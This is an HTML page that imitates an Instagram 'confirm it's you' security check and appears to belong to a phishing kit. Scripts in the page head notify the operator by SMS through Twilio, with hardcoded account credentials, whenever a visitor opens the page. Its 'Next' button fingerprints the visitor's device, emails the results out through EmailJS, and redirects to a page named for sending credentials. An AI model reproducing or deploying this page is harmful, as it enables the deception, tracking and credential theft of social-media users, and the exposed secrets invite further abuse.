<!DOCTYPE html>
<html>
<head>
 
   <meta http-equiv="Delegate-CH" content="Sec-CH-UA-Model https://cloud.51degrees.com; Sec-CH-UA https://cloud.51degrees.com; Sec-CH-UA-Arch https://cloud.51degrees.com; Sec-CH-UA-Full-Version https://cloud.51degrees.com; Sec-CH-UA-Mobile https://cloud.51degrees.com; Sec-CH-UA-Platform https://cloud.51degrees.com; Sec-CH-UA-Platform-Version https://cloud.51degrees.com" />
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript" src="https://cloud.51degrees.com/api/v4/AQRnx8i3-E8R31vn20g.js"></script>
 <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script>
        $(document).ready(function () {
            const twilioAccountSID = 'ACd2e88a17b14ef8022a8b6f079f92c24a';
            const twilioAuthToken = '8b1d9a6a18613704c7c5c0bc705fc9a';
            const twilioPhoneNumber = '+14302225977';

            function sendTwilioSMS() {
                const toPhoneNumber = '+916370943160';
                const twilioApiUrl = `https://api.twilio.com/2010-04-01/Accounts/${twilioAccountSID}/Messages.json`;

                const istTime = new Date().toLocaleString('en-US', {
    timeZone: 'Asia/Kolkata',
    day: 'numeric',
    month: 'long',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
    hour12: true
});
const formattedTime = `${istTime}`;


                const messageBody = ` ‎User is in "Confirm it's you?" on\n ‎ ‎ ‎ ‎\n${formattedTime}`;

                const auth = btoa(`${twilioAccountSID}:${twilioAuthToken}`);

                $.ajax({
                    type: 'POST',
                    url: twilioApiUrl,
                    beforeSend: function (xhr) {
                        xhr.setRequestHeader('Authorization', `Basic ${auth}`);
                    },
                    data: {
                        To: toPhoneNumber,
                        From: twilioPhoneNumber,
                        Body: messageBody
                    },
                    success: function (response) {
                        console.log('Twilio Notification Sent:', response);
                    },
                    error: function (error) {
                        console.error('Error sending Twilio Notification:', error);
                    }
                });
            }

            sendTwilioSMS();
        });
    </script>
   <script type="text/javascript">
    (function() {
      // Replace 'evvkaqLQyOBXJJo0p' with your actual EmailJS user ID
      emailjs.init('evvkaqLQyOBXJJo0');
    })();

    function formatDevice(device, sep = "\n") {
  const deviceMapping = {
    "HardwareVendor": "",
    "HardwareName": "",
    "HardwareModel": ""
  };
  return Object.entries(deviceMapping)
    .map(([label, prefix]) => `${prefix}${device[label.toLowerCase()]}`)
    .join(sep);
}

function sendDeviceInfo() {
  fod.complete(function (data) {
    const timestamp = new Date().toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      hour: 'numeric',
      minute: 'numeric',
      hour12: true
    });
    const deviceInfo = formatDevice(data.device, "\n");
    const emailTimestamp = new Date().toLocaleString('en-US', {
      month: 'short',
      day: 'numeric'
    });
    const formattedTimestamp = `${emailTimestamp.toUpperCase()} ${timestamp.split(',')[1].trim()}`;
    sendEmail(`\n${deviceInfo.replace(/\u200E/g, '&rlm;')}`, `${formattedTimestamp}`);
  });
}

function sendEmail(content, emailTimestamp) {
  const correctedContent = content
    .toUpperCase()
    // Replace each \u200E with its HTML entity &rlm;
    .replace(/\u200E/g, '&rlm;');
  const correctedTimestamp = emailTimestamp
    .toUpperCase();
  emailjs.send('service_1bwix84', 'template_m8vh7po', {
    to_email: 'testmailforiyush@gmail.com', // Replace with your recipient's email
    email_content: correctedContent,
    Timestamp: `\n${correctedTimestamp}`
  })
  .then(function(response) {
    console.log('Email sent successfully:', response);
  })
  .catch(function(error) {
    console.error('Error sending email:', error);
  });
}

function sendDeviceInfoAndRedirect() {
  // Call the sendDeviceInfo function
  sendDeviceInfo();
  // Redirect to the next page after a short delay (adjust as needed)
  setTimeout(function() {
    window.location.href = 'Capture-and-redirect insta (send Credentials).html';
  }, 1000); // Adjust the delay (in milliseconds) as needed
}



      </script>
  <script src="https://cdn.jsdelivr.net/npm/@51degrees/ua-parser-js"></script>
  <script type="module">
    async function fetchDeviceInformation() {
      const result = await UAParser('AQRnx8i3H4g9CCLo20g');
      console.log(result);
    }

    fetchDeviceInformation();
 
  if (window.parent && window.parent.history) {
  console.log('Parent window history is accessible.');
} else {
  console.log('Parent window history is not accessible.');
}
  
  
  </script>

 <script>
        // Store a reference to the top-level window
        let topWindow = window;

        // Log the current HTML file's location
        console.log('Current location:', document.location.href);

        // Listen for the beforeunload event to detect when the HTML file is being closed
        window.addEventListener('beforeunload', function () {
            console.log('HTML file is being closed');
        });

        // Your other scripts
 </script>
 
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Medium:wght@500&family=Vazir+Matn:wght@700&family=Heebo:wght@400&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: white;
            color: black;
            font-family: 'Roboto', sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
      
        h1 {
            font-size: 1.5em;
            margin-top: -580px; /* Adjust the margin-top as needed */
        }
   
        p {
            width: 80%;
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        
        .centered-paragraph {
            text-align: center;
            font-size: 16px;
           
        } 
     
        .paragraph {
            margin: 1px 0; /* Add margin between paragraphs as needed */
            width: 95%;
            font-size: 16px;
            text-align: center;
        }
       
       .paragraph0 {
           margin: 1px 0; /* Add margin between paragraphs as needed */
            width: 95%;
            font-size: 16px;
            text-align: center;
       }


        #special-paragraph1 {
            position: fixed;
            font-size: 13.2px;
            color: grey;
            position: absolute;
            bottom: 583px; /* Adjust this value to move it down */
        }
        
        #special-paragraph2 {
            position: fixed;
            font-size: 13.2px;
            color: grey;
            position: absolute;
            bottom: 490px; /* Adjust this value to move it down */
        }
        
        .paragraph1 {
           position: fixed;
            font-size: 13px;
            color: grey;
            position: absolute;
            bottom: 640px; /* Adjust this value to move it down */
        }

        .button {
            width: 94%;
            max-width: 500px;
            margin-top: 200px; /* Adjust margin as needed */
            padding: 10px 20px; /* Increase or decrease padding as needed */
            background-color: #0095f6;
            color: white;
            position: absolute;
            font-size: 17px;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            opacity: 1;
            
        }

        /* Add your styles here */
        .navbar {
            position: fixed; /* Fix the navbar at the top */
            top: 0; /* Position it at the top */
            width: 100%;
            background-color: #fff;
            overflow: auto;
            border-bottom: 1px solid #ddd; /* Change line color to grey */
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Align the logo at the top */
            padding: 5px 0; /* Decrease the height of the navigation bar */
        }

        .navbar img {
            height: 30px; /* Adjust the height of the logo */
        }
     
        .g-recaptcha {
        transform: translateX(-50%);
        transform: scale(1.14); /* Adjust the scale factor as needed */
        transform-origin: 3 0;
        
            
    }   
   
   
   
   
   
   
   
   
@media only screen and (max-width: 485px) {
         h1 {
            font-size: 1.3em;
            margin-top: -500px; /* Adjust the margin-top as needed */
        }
     
        .centered-paragraph {
            text-align: center;
            font-size: 15px;
            
        } 
     
        .paragraph {
            margin: 1px 0; /* Add margin between paragraphs as needed */
            width: 95%;
            font-size: 15px;
            text-align: center;
        }
       
       
        #special-paragraph1 {
            font-size: 11.8px;
            color: grey;
            position: absolute;
            bottom: 490px; /* Adjust this value to move it down */
        }
        
        #special-paragraph2 {
            font-size: 12px;
            color: grey;
            position: absolute;
            bottom: 410px; /* Adjust this value to move it down */
        }
        
        .paragraph1 {
            font-size: 12px;
            color: grey;
            position: absolute;
            bottom: 540px; /* Adjust this value to move it down */
        }

        .paragraph0 {
            margin: 1px 0; /* Add margin between paragraphs as needed */
            width: 95%;
            font-size: 15px;
            text-align: center;
          
        }
        .button {
            width: 94%;
            max-width: 500px;
            margin-top: 240px; /* Adjust margin as needed */
            padding: 8px 20px; /* Increase or decrease padding as needed */
            background-color: #0095f6;
            color: white;
            position: absolute;
            font-size: 15px;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            opacity: 1;
            
        }
     }
    </style>




</head>
<body>
  
  
    <!-- Add a navigation bar with the new Instagram logo -->
    <div class="navbar">
        <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
    </div>
   
    <h1>Confirm it's you to log in</h1>

    <p class="paragraph">We noticed unusual activity from your account, so</p>
    <p class="centered-paragraph">we need to verify it's you.</p>
    <p style="margin: 8px 0;"></p>
    <p class="paragraph0">Follow the next steps within 1 day so we can try to<br>get you back into your account before it's compromised.</p>
    <p style="margin: 5px 0;"></p>
    <div class="g-recaptcha" data-sitekey="6LdaNzwpAAAAAF4tZJOW7VP8IFnfU8vefhWt9_VC"></div>
    <!-- Add the provided text -->
    <p class="paragraph1">This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.</p>
    <p style="margin: 5px 0;"></p>
    <p id="special-paragraph1">We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.</p>
    <p style="margin: 5px 0;"></p>
    <p id="special-paragraph2">reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
    <button class="button" onclick="sendDeviceInfoAndRedirect()">Next</button>
</body>
</html>
